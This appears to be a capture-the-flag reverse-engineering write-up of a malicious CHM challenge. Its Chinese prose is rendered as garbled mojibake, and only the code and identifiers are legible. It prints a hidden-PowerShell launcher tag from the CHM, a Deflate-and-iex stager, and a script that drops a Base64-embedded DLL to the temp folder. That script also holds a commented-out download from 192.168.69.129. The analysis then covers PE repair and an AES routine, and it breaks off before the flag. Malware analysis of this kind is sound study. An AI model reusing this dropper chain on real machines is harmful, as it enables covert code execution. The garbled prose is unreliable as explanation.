# CTFé€†å‘é¢˜å®Œæ•´è§£é¢˜æŠ¥å‘Š - reverse_html

## é¢˜ç›®ä¿¡æ¯

- **æ¥æº**: ä¸­å›½ä¿¡æ¯é€šä¿¡ç ”ç©¶é™¢ (CAICT)
- **éš¾åº¦**: â­â­â­â­â­â­â­â­ (8/10) - ä¸­é«˜éš¾åº¦
- **æ–¹å‘**: Reverse (é€†å‘å·¥ç¨‹)
- **ç±»åˆ«**: æ–‡ä»¶æ ¼å¼åˆ†æ (CHM) + æ··æ·†æŠ€æœ¯ (PowerShell + åŠ¨æ€ä»£ç æ‰§è¡Œ) + å¯†ç å­¦ (AES-128) + PEæ–‡ä»¶ä¿®å¤
- **æ–‡ä»¶**: `challenge` (CHMæ–‡ä»¶)
- **æ¶æ„**: Windows x86 PE DLL
- **ä¸»è¦æŠ€æœ¯**: CHMæ–‡ä»¶è§£æã€Base64å¤šå±‚ç¼–ç ã€Deflateå‹ç¼©ã€PEæ–‡ä»¶ç»“æ„ä¿®å¤ã€AES-128åŠ å¯†

## é¢˜ç›®æ¦‚è¿°

è¿™æ˜¯ä¸€é“ç»¼åˆæ€§æå¼ºçš„CTFé€†å‘é¢˜ç›®ï¼Œæ¶‰åŠ**CHMæ–‡ä»¶æ ¼å¼ã€PowerShellæ··æ·†ã€PEæ–‡ä»¶ä¿®å¤ã€èŠ±æŒ‡ä»¤ã€AESåŠ å¯†åˆ†æ**ç­‰å¤šä¸ªæŠ€æœ¯ç‚¹ã€‚é¢˜ç›®é€šè¿‡å¤šå±‚æ··æ·†å’ŒåµŒå¥—ï¼Œå°†çœŸæ­£çš„flagéšè—åœ¨ç»è¿‡AESåŠ å¯†çš„æ•°æ®ä¸­ï¼Œéœ€è¦é€å±‚å‰¥ç¦»æ‰èƒ½è·å–æœ€ç»ˆç­”æ¡ˆã€‚

---

## è§£é¢˜æ€è·¯å…¨è¿‡ç¨‹

### ç¬¬ä¸€æ­¥ï¼šæ–‡ä»¶è¯†åˆ« - CHMæ˜¯ä»€ä¹ˆï¼Ÿ

#### 1.1 åˆæ­¥åˆ†æ

æ‹¿åˆ°æ–‡ä»¶`challenge`åï¼Œé¦–å…ˆç¡®å®šæ–‡ä»¶ç±»å‹ï¼š

```bash
file challenge
# challenge: MS Windows HtmlHelp Data
```

**å…³é”®å‘ç°**: è¿™æ˜¯ä¸€ä¸ªCHMï¼ˆCompiled HTML Helpï¼‰æ–‡ä»¶ï¼

**CHMæ–‡ä»¶ç‰¹ç‚¹**:
- Microsoftç¼–è¯‘çš„å¸®åŠ©æ–‡æ¡£æ ¼å¼
- å†…éƒ¨åŒ…å«HTMLã€å›¾ç‰‡ç­‰èµ„æº
- å†å²ä¸Šæ›¾è¢«ç”¨äºæ¶æ„ä»£ç ä¼ æ’­
- å¯ä»¥æ‰§è¡ŒJavaScriptå’ŒActiveXå¯¹è±¡

#### 1.2 å°è¯•ç”¨å·¥å…·æ‰“å¼€

ç›´æ¥åŒå‡»æ–‡ä»¶ä¼šç”¨Windowsé»˜è®¤çš„CHMæŸ¥çœ‹å™¨æ‰“å¼€ï¼Œä½†è¿™æ ·çœ‹ä¸åˆ°å†…éƒ¨ç»“æ„ã€‚éœ€è¦è§£å‹CHMæ–‡ä»¶æŸ¥çœ‹å…¶å†…å®¹ã€‚

**å¯ç”¨å·¥å…·**:
- 7-Zipï¼ˆæ¨èï¼ŒWindowsä¸‹æœ€æ–¹ä¾¿ï¼‰
- hh.exe -decompileï¼ˆWindowså†…ç½®å·¥å…·ï¼‰
- chmLibï¼ˆLinuxå·¥å…·ï¼‰

### ç¬¬äºŒæ­¥ï¼šè§£å‹CHMæ–‡ä»¶ - å‘ç°æ¶æ„ä»£ç 

#### 2.1 ä½¿ç”¨7-Zipè§£å‹

```bash
7z x challenge -ochallenge~
```

è§£å‹åå¾—åˆ°ç›®å½•ç»“æ„ï¼š
```
challenge~/
â”œâ”€â”€ doc.htm          # ä¸»HTMLæ–‡ä»¶
â”œâ”€â”€ #SYSTEM         # CHMç³»ç»Ÿæ–‡ä»¶
â”œâ”€â”€ #STRINGS        # å­—ç¬¦ä¸²è¡¨
â””â”€â”€ ...
```

#### 2.2 åˆ†ædoc.htm

æ‰“å¼€`doc.htm`ï¼Œå‘ç°ä¸€ä¸ª**è¶…é•¿çš„OBJECTæ ‡ç­¾**ï¼ˆç¬¬11è¡Œï¼‰ï¼š

```html
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">
<PARAM name="Command" value="ShortCut">
<PARAM name="Item1" value=",cmd.exe,/c START /MIN C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile powershell.exe -WindowStyle hidden -nologo -noprofile -e SQBuAHYAbw...">
</OBJECT>
```

**å…³é”®è§‚å¯Ÿ**:
- `classid`æ˜¯ç”¨äºæ‰§è¡Œå‘½ä»¤çš„ActiveXå¯¹è±¡
- ä½¿ç”¨cmd.exeå¯åŠ¨PowerShellï¼Œå¸¦æœ‰å¤šä¸ªéšè—å’Œç»•è¿‡æ‰§è¡Œç­–ç•¥çš„å‚æ•°
- æœ€ç»ˆä½¿ç”¨PowerShellçš„`-e`å‚æ•°æ‰§è¡ŒBase64ç¼–ç çš„å‘½ä»¤
- Base64å­—ç¬¦ä¸²å¼‚å¸¸é•¿ï¼ˆä»`SQBuAHYAbw...`å¼€å§‹ï¼Œçº¦4000+å­—ç¬¦ï¼‰

**ç¬¬ä¸€ä¸ªå…³é”®å‘ç°**: CHMæ–‡ä»¶è¢«ç”¨ä½œæ¶æ„ä»£ç è½½ä½“ï¼

### ç¬¬ä¸‰æ­¥ï¼šPowerShellå‘½ä»¤è§£ç  - å¤šå±‚ç¼–ç 

#### 3.1 æå–Base64å­—ç¬¦ä¸²

é¦–å…ˆæå–OBJECTæ ‡ç­¾ä¸­çš„Base64éƒ¨åˆ†ï¼ˆ`-e`å‚æ•°åé¢çš„éƒ¨åˆ†ï¼‰ï¼š

```python
# ä»doc.htmç¬¬11è¡Œæå–ï¼Œ-eå‚æ•°åçš„Base64å­—ç¬¦ä¸²
base64_cmd = "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAo..." # çº¦4000+å­—ç¬¦
```

#### 3.2 ç¬¬ä¸€å±‚è§£ç  - UTF-16 LE

PowerShellçš„`-e`å‚æ•°æœŸæœ›UTF-16 LEç¼–ç ï¼š

```python
import base64
decoded_utf16 = base64.b64decode(base64_cmd)
powershell_code = decoded_utf16.decode('utf-16le')
```

**ç»“æœ**: å¾—åˆ°ä¸€æ®µPowerShellè„šæœ¬ï¼

```powershell
$i="eJxT8s...å¾ˆé•¿çš„Base64å­—ç¬¦ä¸²...";
$b=[Convert]::FromBase64String($i);
$ms=New-Object IO.MemoryStream;
$ms.Write($b,0,$b.Length);
$ms.Seek(0,0)|Out-Null;
$cs=New-Object IO.Compression.DeflateStream($ms,[IO.Compression.CompressionMode]::Decompress);
$sr=New-Object IO.StreamReader($cs);
$t=$sr.ReadToEnd();
iex $t;
```

**ç¬¬äºŒä¸ªå…³é”®å‘ç°**: PowerShellä»£ç å¯¹å†…éƒ¨Base64æ•°æ®è¿›è¡Œ**Deflateè§£å‹ç¼©**ï¼

#### 3.3 ç¬¬äºŒå±‚è§£ç  - Deflateè§£å‹

```python
import zlib

inner_b64 = "eJxT8s..." # ä»PowerShellä¸­æå–
compressed_data = base64.b64decode(inner_b64)
# ä½¿ç”¨raw deflateï¼ˆæ— zlibå¤´ï¼‰
decompressed_data = zlib.decompress(compressed_data, -zlib.MAX_WBITS)
```

**ç»“æœ**: å¾—åˆ°å¦ä¸€æ®µPowerShellè„šæœ¬ï¼

```powershell
# $client = new-object System.Net.WebClient;
# $client.DownloadFile("http://192.168.69.129:8000/ielogo.png", ...)

# read file
$content = [IO.File]::ReadAllText("$pwd\doc.chm")
$idx1 = $content.IndexOf("xxxxxxxx")

$helper = $content.Substring($idx1 + 8)
$cont = [System.Convert]::FromBase64String($helper)

Set-Content "$env:temp\20201122.tmp" $cont -Encoding byte
```

**ç¬¬ä¸‰ä¸ªå…³é”®å‘ç°**: 
1. ç¨‹åºä»`doc.chm`ä¸­æŸ¥æ‰¾`"xxxxxxxx"`æ ‡è®°
2. æå–æ ‡è®°åçš„Base64æ•°æ®å¹¶è§£ç 
3. ä¿å­˜ä¸ºä¸´æ—¶æ–‡ä»¶`20201122.tmp`

### ç¬¬å››æ­¥ï¼šæå–æœ€ç»ˆè½½è· - PEæ–‡ä»¶

#### 4.1 æœç´¢"xxxxxxxx"æ ‡è®°

```python
with open('doc.chm', 'rb') as f:
    content = f.read()

idx = content.find(b'xxxxxxxx')
print(f"æ ‡è®°ä½ç½®: {hex(idx)}")  # 0x3767 (14183)
```

#### 4.2 æå–Base64æ•°æ®å¹¶è§£ç 

```python
base64_data = content[idx + 8:].decode('ascii')
pe_data = base64.b64decode(base64_data)

with open('20201122.tmp', 'wb') as f:
    f.write(pe_data)

print(f"æ–‡ä»¶å¤§å°: {len(pe_data)} å­—èŠ‚")  # 9214å­—èŠ‚
```

**ç¬¬å››ä¸ªå…³é”®å‘ç°**: æå–å‡ºä¸€ä¸ª9214å­—èŠ‚çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼

### ç¬¬äº”æ­¥ï¼šPEæ–‡ä»¶åˆ†æ - å‘ç°æŸå

#### 5.1 æ£€æŸ¥æ–‡ä»¶å¤´

```python
with open('20201122.tmp', 'rb') as f:
    header = f.read(16)
    
print(f"å‰16å­—èŠ‚: {header.hex()}")
# 90000300000004000000ffff0000b800

dos_sig = header[0] | (header[1] << 8)
print(f"DOSç­¾å: {hex(dos_sig)}")  # 0x90
```

**é—®é¢˜å‘ç°**: DOSç­¾ååº”è¯¥æ˜¯`0x5A4D`ï¼ˆ"MZ"ï¼‰ï¼Œä½†è¿™é‡Œæ˜¯`0x90`ï¼

#### 5.2 æŸ¥æ‰¾PEç­¾å

```python
# æœç´¢"PE\x00\x00"ç­¾å
for i in range(len(data) - 4):
    if data[i:i+4] == b'PE\x00\x00':
        print(f"æ‰¾åˆ°PEç­¾ååœ¨åç§»: {hex(i)}")  # 0xf6
```

**ç¬¬äº”ä¸ªå…³é”®å‘ç°**: PEå¤´è¢«ç ´åäº†ï¼Œéœ€è¦ä¿®å¤ï¼

### ç¬¬å…­æ­¥ï¼šä¿®å¤PEæ–‡ä»¶ - é‡å»ºç»“æ„

#### 6.1 ä¿®å¤DOSå¤´

```python
# ä¿®å¤MZç­¾å
data[0] = 0x4D  # 'M'
data[1] = 0x5A  # 'Z'

# ä¿®å¤PEåç§»æŒ‡é’ˆï¼ˆåœ¨0x3Cå¤„ï¼‰
pe_offset = 0xf6
data[0x3C] = pe_offset & 0xFF
data[0x3D] = (pe_offset >> 8) & 0xFF
data[0x3E] = (pe_offset >> 16) & 0xFF
data[0x3F] = (pe_offset >> 24) & 0xFF
```

#### 6.2 ä¿å­˜ä¿®å¤åçš„æ–‡ä»¶

```python
with open('20201122_fixed.exe', 'wb') as f:
    f.write(data)
```

**éªŒè¯**: ç”¨IDA Proæ‰“å¼€ä¿®å¤åçš„æ–‡ä»¶ï¼ŒæˆåŠŸè¯†åˆ«ä¸ºæœ‰æ•ˆçš„PE DLLï¼

### ç¬¬ä¸ƒæ­¥ï¼šIDAé™æ€åˆ†æ - è¯†åˆ«AES

#### 7.1 æŸ¥çœ‹å…¥å£ç‚¹

```c
BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    if ( v4[3] == 1 )  // fdwReason == DLL_PROCESS_ATTACH
        sub_1000190C();
    return sub_10001645(v4[2], v4[3], v4[4]);
}
```

**å…³é”®**: DLLåœ¨åŠ è½½æ—¶ï¼ˆ`fdwReason == 1`ï¼‰ä¼šè°ƒç”¨åˆå§‹åŒ–å‡½æ•°ã€‚

#### 7.2 ä½¿ç”¨findcryptæ’ä»¶

åœ¨IDAä¸­è¿è¡Œfindcryptæ’ä»¶ï¼Œå‘ç°ï¼š

```
Address         Name                    Value
.rdata:100031BE RijnDael_AES_CHAR       0x63 0x7c 0x77...
.rdata:100031BE RijnDael_AES_LONG       (AES S-box)
.rdata:100030BE RijnDael_AES_LONG_inv   (AESé€†S-box)
```

**ç¬¬å…­ä¸ªå…³é”®å‘ç°**: ç¨‹åºä½¿ç”¨äº†**AESåŠ å¯†ç®—æ³•**ï¼

#### 7.3 åˆ†æåŠ å¯†å‡½æ•°

æŸ¥çœ‹`sub_1000113E`å‡½æ•°ï¼ˆå¯†é’¥æ‰©å±•ï¼‰ï¼š

```c
char *__fastcall sub_1000113E(_BYTE *a1, char *a2)
{
    // AESå¯†é’¥æ‰©å±•ç®—æ³•
    for (int i = 0; i < 10; i++) {  // 10è½® = AES-128
        // SubBytes
        *a1 = byte_100031C0[*a2];
        
        // ShiftRows
        v11 = a1[1];
        a1[1] = a1[5];
        a1[5] = a1[9];
        // ...
        
        // MixColumns
        // ...
    }
}
```

æŸ¥çœ‹`sub_1000125E`å‡½æ•°ï¼ˆåŠ å¯†ä¸»ä½“ï¼‰ï¼š

```c
int __fastcall sub_1000125E(unsigned __int8 *a1, int a2)
{
    // AddRoundKey
    for (int i = 0; i < 16; i++)
        *a1 ^= a1[a2 - a1];
    
    for (i = 1; i <= 10; i++) {  // 10è½®åŠ å¯†
        // SubBytes
        // ShiftRows  
        // MixColumns
        // AddRoundKey
    }
}
```

**ç¡®è®¤**: è¿™æ˜¯æ ‡å‡†çš„**AES-128åŠ å¯†ç®—æ³•**ï¼

### ç¬¬å…«æ­¥ï¼šå¯»æ‰¾å¯†é’¥å’Œå¯†æ–‡ - ä»£ç åˆ†æ

#### 8.1 æŸ¥æ‰¾AESè°ƒç”¨ä½ç½®

é€šè¿‡äº¤å‰å¼•ç”¨`sub_1000125E`ï¼ˆAESåŠ å¯†ä¸»å‡½æ•°ï¼‰ï¼Œå‘ç°åœ¨åœ°å€`0x100010b8`é™„è¿‘æœ‰è°ƒç”¨è¯¥å‡½æ•°çš„ä»£ç ã€‚è¿™ä¸ªä½ç½®å±äºç¨‹åºçš„åˆå§‹åŒ–éƒ¨åˆ†ï¼Œåœ¨é‚£é‡Œå‡†å¤‡äº†åŠ å¯†æ‰€éœ€çš„æ•°æ®ã€‚

#### 8.2 åˆ†æå…³é”®æ•°æ®æ®µ - èŠ±æŒ‡ä»¤æŠ€æœ¯

åœ¨IDAä¸­æŸ¥çœ‹åœ°å€`0x10001000`å¼€å§‹çš„åŒºåŸŸï¼Œå‘ç°è¿™é‡Œè¢«IDAè¯†åˆ«ä¸º**æ•°æ®æ®µ**ï¼ˆ`dword_10001000`ï¼‰ï¼Œè€Œéä»£ç ã€‚è¿™æ˜¯å› ä¸ºIDAæ— æ³•å°†è¿™äº›å­—èŠ‚è¯†åˆ«ä¸ºæœ‰æ•ˆçš„x86æŒ‡ä»¤åºåˆ—ã€‚

æŸ¥çœ‹åŸå§‹æ•°æ®ï¼š

```assembly
.text:10001000 dword_10001000  dd 0F8E483ECh, 0FCEC81h, 4A10000h, 33100040h, 248489C4h
.text:10001000                                         ; DATA XREF: sub_1000110E+Fâ†“o
.text:10001014                 dd 0F8h, 24948D56h, 0DCh, 0DC2484C7h, 2B000000h, 8D16157Eh
.text:1000102C                 dd 0C708244Ch, 0E02484h, 0AE280000h, 84C7A6D2h, 0E424h
.text:10001040                 dd 15F7AB00h, 2484C788h, 0E8h, 3C4FCF09h, 0EC2484C7h, 1F000000h
.text:10001058                 dd 0C779C7EAh, 0F02484h, 3B550000h, 84C782F8h, 0F424h
.text:1000106C                 dd 54B35100h, 2484C780h, 0F8h, 75B6A6CFh, 0CC2484C7h, 0
```

**å…³é”®è§‚å¯Ÿ**: æ³¨æ„åˆ°`DATA XREF: sub_1000110E+Fâ†“o`ï¼Œè¯´æ˜æœ‰å‡½æ•°å¼•ç”¨äº†è¿™ä¸ªæ•°æ®æ®µçš„èµ·å§‹åœ°å€ã€‚

**èŠ±æŒ‡ä»¤æŠ€æœ¯ç‚¹** â­â­â­â­â­

è¿™é‡Œä½¿ç”¨äº†ä¸€ç§ç»å…¸çš„**åæ±‡ç¼–æ··æ·†æŠ€æœ¯**ï¼Œç§°ä¸º**èŠ±æŒ‡ä»¤**æˆ–**åƒåœ¾æŒ‡ä»¤**ï¼ˆJunk Code / Anti-Disassemblyï¼‰ï¼š

**1. ä¸ºä»€ä¹ˆIDAå°†ä»£ç è¯†åˆ«ä¸ºæ•°æ®ï¼Ÿ**

IDAçš„è‡ªåŠ¨åˆ†æç®—æ³•ä¾èµ–äºï¼š
- ä»å·²çŸ¥å…¥å£ç‚¹å¼€å§‹é€’å½’åæ±‡ç¼–
- è¯†åˆ«æœ‰æ•ˆçš„å‡½æ•°åºè¨€ï¼ˆå¦‚`push ebp; mov ebp, esp`ï¼‰
- è·Ÿè¸ªæ§åˆ¶æµï¼ˆcallã€jmpç­‰æŒ‡ä»¤ï¼‰

ä½†è¿™æ®µä»£ç çš„å¼€å¤´æ˜¯ï¼š
```assembly
.text:10001000    EC                 in      al, dx          ; èŠ±æŒ‡ä»¤ï¼
.text:10001001    83 E4 F8           and     esp, 0FFFFFFF8h
.text:10001004    81 EC 00 04 00 00  sub     esp, 400h
```

**ç¬¬ä¸€æ¡æŒ‡ä»¤`EC`ï¼ˆ`in al, dx`ï¼‰æ˜¯ä¸€æ¡ç‰¹æƒæŒ‡ä»¤**ï¼Œåœ¨ç”¨æˆ·æ€ç¨‹åºä¸­æå°‘ä½¿ç”¨ï¼Œè¿™ä¼šè®©IDAçš„å¯å‘å¼ç®—æ³•è®¤ä¸ºè¿™ä¸æ˜¯æœ‰æ•ˆä»£ç ï¼Œä»è€Œåœæ­¢åæ±‡ç¼–ï¼Œå°†åç»­å­—èŠ‚å½“ä½œæ•°æ®å¤„ç†ã€‚


#### 8.3 è¿½è¸ªæ•°æ®å¼•ç”¨é“¾

ç°åœ¨è¿½è¸ªæ•°æ®æ˜¯å¦‚ä½•è¢«ä½¿ç”¨çš„ï¼š

**æ­¥éª¤1**: æŸ¥çœ‹`sub_1000110E`å‡½æ•°ï¼ˆå®ƒå¼•ç”¨äº†`dword_10001000`ï¼‰

åœ¨`sub_1000110E`ä¸­æ‰¾åˆ°å…³é”®ä»£ç ï¼š
```assembly
.text:10001117                 push    0                        ; å‚æ•°6
.text:10001119                 push    0                        ; å‚æ•°5
.text:1000111B                 push    0                        ; å‚æ•°4
.text:1000111D                 push    offset unk_10001000      ; å‚æ•°3: ä¼ é€’ 0x10001000 çš„åœ°å€
.text:10001122                 push    0                        ; å‚æ•°2
.text:10001124                 push    0                        ; å‚æ•°1
.text:10001126                 call    dword ptr ds:byte_10003001+3  ; é—´æ¥è°ƒç”¨
```

**è¯¦ç»†è§£æï¼šIAT é—´æ¥è°ƒç”¨æœºåˆ¶**

è¿™é‡Œä½¿ç”¨äº† **IAT é—´æ¥è°ƒç”¨**ï¼ˆImport Address Tableï¼‰ã€‚

**æ ¸å¿ƒé—®é¢˜1ï¼šä¸ºä»€ä¹ˆæœ‰æ–¹æ‹¬å· `[]`ï¼Ÿ**

è¿™æ˜¯ x86 æ±‡ç¼–çš„**å¯»å€æ¨¡å¼**å·®å¼‚ï¼š

| æŒ‡ä»¤ | å«ä¹‰ | è¯´æ˜ |
|------|------|------|
| `call 0x10003004` | ç›´æ¥è°ƒç”¨ | è·³è½¬åˆ°åœ°å€ 0x10003004 æ‰§è¡Œé‚£é‡Œçš„æœºå™¨ç  |
| `call [0x10003004]` | é—´æ¥è°ƒç”¨ | **è¯»å–** 0x10003004 å¤„çš„4å­—èŠ‚ä½œä¸ºç›®æ ‡åœ°å€ |

**åœ°å€è®¡ç®—**ï¼š
```
byte_10003001 + 3 = 0x10003001 + 3 = 0x10003004

å› æ­¤ï¼š
call dword ptr ds:byte_10003001+3  (IDAç¬¦å·è¡¨ç¤º)
ç­‰ä»·äºï¼š
call dword ptr ds:[0x10003004]     (å®é™…æœºå™¨ç ï¼šé—´æ¥å¯»å€)
```

**æ ¸å¿ƒé—®é¢˜2ï¼šå¦‚ä½•ç¡®å®šæ˜¯ CreateThread å‡½æ•°ï¼Ÿ**

**è¯æ®**ï¼ˆä» PE æ–‡ä»¶å®é™…è¯»å–ï¼Œä¸æ˜¯çŒœæµ‹ï¼‰ï¼š

1. **æŸ¥çœ‹ IAT æ¡ç›®å†…å®¹**
   ```
   0x10003004 å­˜å‚¨: 0x00 0x00 0x06 0x37 (å°ç«¯åº) = 0x10003706
   ```

2. **æŸ¥çœ‹å‡½æ•°åå­—ç¬¦ä¸²**
   ```
   0x10003706 å†…å®¹: 0x43 0x72 0x65 0x61 0x74 0x65 0x54 0x68 0x72 0x65 0x61 0x64 0x00
   ASCII è§£æ: "CreateThread"
   ```

**åœ¨ IDA ä¸­éªŒè¯**ï¼ˆä½ çœ‹åˆ° `extrn` çš„åŸå› ï¼‰ï¼š

ä½ çœ‹åˆ° `.idata:10003004 extrn unk_10003004` æ˜¯å› ä¸º IDA å°†å…¶æ ‡è®°ä¸ºå¤–éƒ¨ç¬¦å·ã€‚æŸ¥çœ‹å®é™…æ•°æ®ï¼š

- **æ–¹æ³•1ï¼ˆæ¨èï¼‰**ï¼šæŒ‰ `H` é”®æ‰“å¼€ Hex View â†’ æŒ‰ `G` è·³è½¬åˆ° `0x10003004` â†’ çœ‹åˆ° `00 00 06 37`
- **æ–¹æ³•2**ï¼šæŒ‰ `G` è·³è½¬åˆ° `0x10003706` â†’ çœ‹åˆ° "CreateThread" å­—ç¬¦ä¸²ï¼ˆæŒ‰ `A` å®šä¹‰ä¸ºå­—ç¬¦ä¸²ï¼‰
- **æ–¹æ³•3**ï¼šå…‰æ ‡ç§»åˆ° `0x10003004` â†’ æŒ‰ `U` å–æ¶ˆå®šä¹‰ â†’ æŒ‰ `D` 4æ¬¡å®šä¹‰ä¸º dword â†’ æ˜¾ç¤º `dd 10003706h`

**IAT å·¥ä½œåŸç†**ï¼š
- **ç¼–è¯‘æ—¶**ï¼š`0x10003004` æŒ‡å‘å‡½æ•°å (`0x10003706 = "CreateThread"`)
- **è¿è¡Œæ—¶**ï¼šWindows åŠ è½½å™¨æ›¿æ¢ä¸º CreateThread çš„çœŸå®åœ°å€
- **è°ƒç”¨æ—¶**ï¼š`call [0x10003004]` è¯»å–è¯¥å€¼å¹¶è·³è½¬

**å®Œæ•´è°ƒç”¨é“¾**ï¼š
```
sub_1000110E
  â†“ å‹æ ˆå‚æ•°ï¼ˆå…¶ä¸­å‚æ•°3 = 0x10001000ï¼Œçº¿ç¨‹å…¥å£ï¼‰
call [0x10003004]
  â†“ é—´æ¥è°ƒç”¨ï¼ˆè¯»å– IAT è·å– CreateThread åœ°å€ï¼‰
CreateThread(...)
  â†“ åˆ›å»ºæ–°çº¿ç¨‹ï¼Œå…¥å£ç‚¹ = 0x10001000
æ–°çº¿ç¨‹æ‰§è¡Œ 0x10001000 å¤„çš„ä»£ç ï¼ˆèŠ±æŒ‡ä»¤æ··æ·†çš„çœŸå®é€»è¾‘ï¼‰
```

**æ­¥éª¤2ï¼šå°†æ•°æ®è½¬æ¢ä¸ºä»£ç **

åœ¨ IDA ä¸­ï¼šé€‰ä¸­åœ°å€ `0x10001000` â†’ æŒ‰ `C` é”®ï¼ˆé‡æ–°è§£æä¸ºä»£ç ï¼‰â†’ æŒ‰ `F5` æŸ¥çœ‹ä¼ªä»£ç 

**æ­¥éª¤2**: ç†è§£æ•°æ®æ®µçš„åŒé‡èº«ä»½

è¿™æ®µæ•°æ®å®é™…ä¸Šæ˜¯**åŠ¨æ€ç”Ÿæˆçš„ä»£ç **ï¼å½“`call eax`æ‰§è¡Œæ—¶ï¼ŒCPUä¼šå°†è¿™äº›"æ•°æ®"å½“ä½œæœºå™¨ç æ¥æ‰§è¡Œã€‚è¿™æ˜¯ä¸€ç§**ä»£ç æ··æ·†æŠ€æœ¯**ã€‚

**æ­¥éª¤3**: å°†æ•°æ®è½¬æ¢ä¸ºä»£ç ï¼Œå¹¶åˆ‡æ¢åˆ°ä¼ªä»£ç è§†å›¾

é€‰ä¸­åœ°å€`0x10001000`ï¼ŒæŒ‰ä¸‹`C`é”®ï¼ˆCodeï¼‰ï¼Œè®©IDAå°†è¿™äº›å­—èŠ‚é‡æ–°è§£æä¸ºx86æŒ‡ä»¤ã€‚ç„¶åæŒ‰`F5`æŸ¥çœ‹ä¼ªä»£ç ï¼ˆæ›´æ¸…æ™°ï¼‰ï¼š

```c
int __fastcall sub_10001000(int a1, unsigned __int16 a2, int a3)
{
  int *v3; // ecx
  unsigned int v4; // esi
  int *v5; // edx
  bool v6; // cf
  int v8; // [esp-4h] [ebp-FCh] BYREF
  char v9[196]; // [esp+0h] [ebp-F8h] BYREF - æ‰©å±•å¯†é’¥ç¼“å†²åŒº
  int v10[4]; // [esp+C4h] [ebp-34h] BYREF - è¾“å‡ºç¼“å†²åŒºï¼ˆè§£å¯†ç»“æœï¼‰
  int v11[4]; // [esp+D4h] [ebp-24h] BYREF - ç¬¬ä¸€ä¸ªæ•°æ®å—
  int v12[4]; // [esp+E4h] [ebp-14h] BYREF - ç¬¬äºŒä¸ªæ•°æ®å—
  unsigned int v13; // [esp+F4h] [ebp-4h] - Stack Canary

  __inbyte(a2);  // åƒåœ¾æŒ‡ä»¤
  v13 = (unsigned int)&v8 ^ dword_10004004;  // Stack Canaryåˆå§‹åŒ–
  
  // åˆå§‹åŒ–ç¬¬ä¸€ä¸ª16å­—èŠ‚å— v11
  v11[0] = 370507307;    // 0x16157E2B â†’ 2B 7E 15 16
  v11[1] = -1496142296;  // 0xA6D2AE28 â†’ 28 AE D2 A6
  v11[2] = -2011826261;  // 0x8815F7AB â†’ AB F7 15 88
  v11[3] = 1011863305;   // 0x3C4FCF09 â†’ 09 CF 4F 3C
  
  // åˆå§‹åŒ–ç¬¬äºŒä¸ª16å­—èŠ‚å— v12
  v12[0] = 2043144735;   // 0x79C7EA1F â†’ 1F EA C7 79
  v12[1] = -2097661099;  // 0x82F83B55 â†’ 55 3B F8 82
  v12[2] = -2141932719;  // 0x8054B351 â†’ 51 B3 54 80
  v12[3] = 1974904527;   // 0x75B6A6CF â†’ CF A6 B6 75
  
  memset(v10, 0, sizeof(v10));  // æ¸…ç©ºè¾“å‡ºç¼“å†²åŒº
  
  sub_1000113E(v9, (char *)v11);  // å¯†é’¥æ‰©å±•: sub_1000113E(æ‰©å±•å¯†é’¥ç¼“å†²åŒº, åŸå§‹å¯†é’¥)
  sub_1000125E((unsigned __int8 *)v10, (int)v9);  // AESåŠ å¯†/è§£å¯†: sub_1000125E(è¾“å‡º, æ‰©å±•å¯†é’¥)
  
  // æ¯”è¾ƒ v10 å’Œ v12 çš„å†…å®¹
  v3 = v12;
  v4 = 12;
  v5 = v10;
  while ( *v3 == *v5 )
  {
    ++v3;
    ++v5;
    v6 = v4 < 4;
    v4 -= 4;
    if ( v6 )
    {
      unk_10003000(v3, v5, &unk_100030A4, 5);  // åŒ¹é…æˆåŠŸçš„å¤„ç†
      return sub_1000142A((unsigned int)&v8 ^ v13);
    }
  }
  return sub_1000142A((unsigned int)&v8 ^ v13);
}
```

#### 8.3 ç†è§£ç¨‹åºé€»è¾‘

é€šè¿‡åˆ†æä¼ªä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ™°åœ°çœ‹åˆ°ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼š

**å…³é”®å˜é‡è¯´æ˜**ï¼š
- `v11[4]`ï¼šç¬¬ä¸€ä¸ª16å­—èŠ‚æ•°æ®å—ï¼ˆæ ˆåç§»`[ebp-24h]`ï¼‰
- `v12[4]`ï¼šç¬¬äºŒä¸ª16å­—èŠ‚æ•°æ®å—ï¼ˆæ ˆåç§»`[ebp-14h]`ï¼‰
- `v9[196]`ï¼šæ‰©å±•å¯†é’¥ç¼“å†²åŒºï¼ˆæ ˆåç§»`[ebp-F8h]`ï¼‰ï¼Œ196å­—èŠ‚ç”¨äºå­˜å‚¨AES-128æ‰©å±•åçš„11è½®å¯†é’¥
- `v10[4]`ï¼šè¾“å‡ºç¼“å†²åŒºï¼ˆæ ˆåç§»`[ebp-34h]`ï¼‰ï¼Œç”¨äºå­˜å‚¨åŠ å¯†/è§£å¯†ç»“æœ

**ç¨‹åºæ‰§è¡Œæ­¥éª¤**ï¼š

1. **åˆå§‹åŒ–ä¸¤ä¸ªæ•°æ®å—**ï¼š
   ```
   v11 = {370507307, -1496142296, -2011826261, 1011863305}
   v12 = {2043144735, -2097661099, -2141932719, 1974904527}
   ```

2. **æ¸…ç©ºè¾“å‡ºç¼“å†²åŒº**ï¼š
   ```c
   memset(v10, 0, sizeof(v10));
   ```

3. **å¯†é’¥æ‰©å±•**ï¼š
   ```c
   sub_1000113E(v9, (char *)v11);
   ```
   å°†`v11`ä½œä¸ºåŸå§‹å¯†é’¥ï¼Œæ‰©å±•åå­˜å…¥`v9`

4. **æ‰§è¡ŒAESæ“ä½œ**ï¼š
   ```c
   sub_1000125E((unsigned __int8 *)v10, (int)v9);
   ```
   ä½¿ç”¨æ‰©å±•å¯†é’¥`v9`å¯¹æŸäº›æ•°æ®è¿›è¡Œå¤„ç†ï¼Œç»“æœå­˜å…¥`v10`

5. **æ¯”è¾ƒç»“æœ**ï¼š
   ```c
   while ( *v3 == *v5 )  // æ¯”è¾ƒ v12 å’Œ v10
   ```
   å¦‚æœ`v10`çš„å†…å®¹ä¸`v12`å®Œå…¨ç›¸åŒï¼Œåˆ™åŒ¹é…æˆåŠŸ

